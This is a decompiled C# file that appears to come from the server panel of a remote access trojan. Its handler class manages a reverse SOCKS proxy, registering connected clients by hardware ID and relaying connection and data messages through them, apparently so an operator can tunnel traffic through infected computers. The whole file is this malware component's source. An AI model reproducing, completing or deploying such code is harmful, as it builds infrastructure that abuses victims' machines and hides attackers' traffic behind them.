using System;
using System.Windows.Forms;
using Server.Connectings;
using Server.Connectings.Events;
using Server.Helper.Sock5;

namespace Server.Messages
{
	// Token: 0x02000057 RID: 87
	internal class HandlerReverseProxyR
	{
		// Token: 0x060001E4 RID: 484 RVA: 0x0001DFCC File Offset: 0x0001C1CC
		public static void Read(Clients client, object[] objects)
		{
			string a = (string)objects[1];
			if (!(a == "Connect"))
			{
				if (!(a == "Accept"))
				{
					if (!(a == "ConnectResponse"))
					{
						if (!(a == "Data"))
						{
							if (!(a == "Disconnect"))
							{
								return;
							}
							if (!Program.form.ReverseProxyR.work)
							{
								client.Disconnect();
								return;
							}
							Client client2 = (Client)client.Tag;
							if (client2 == null)
							{
								return;
							}
							client2.Disconnect();
							return;
						}
						else
						{
							if (!Program.form.ReverseProxyR.work)
							{
								client.Disconnect();
								return;
							}
							Client client3 = (Client)client.Tag;
							if (client3 == null)
							{
								return;
							}
							client3.Send((byte[])objects[2]);
							return;
						}
					}
					else
					{
						if (!Program.form.ReverseProxyR.work)
						{
							client.Disconnect();
							return;
						}
						Client client4 = (Client)client.Tag;
						if (client4 != null)
						{
							client4.HandleCommandResponse(objects);
						}
						client.Tag = client4;
						return;
					}
				}
				else
				{
					if (!Program.form.ReverseProxyR.work)
					{
						client.Disconnect();
						return;
					}
					Client client5 = Program.form.ReverseProxyR.Server.Search((int)objects[2]);
					client5.Accept(client);
					client.Tag = client5;
					return;
				}
			}
			else
			{
				if (!Program.form.ReverseProxyR.work)
				{
					client.Disconnect();
					return;
				}
				Program.form.ReverseProxyR.Invoke(new MethodInvoker(delegate()
				{
					Program.form.ReverseProxyR.Server.ClientReverse.Add(client);
				}));
				client.eventDisconnect += delegate(object s, EventDisconnect b)
				{
					Control reverseProxyR = Program.form.ReverseProxyR;
					Program.form.ReverseProxyR.Invoke(new MethodInvoker(delegate()
					{
						try
						{
							Program.form.ReverseProxyR.Server.ClientReverse.Remove(client);
						}
						catch
						{
						}
					}));
				};
				client.Hwid = (string)objects[2];
				return;
			}
		}
	}
}
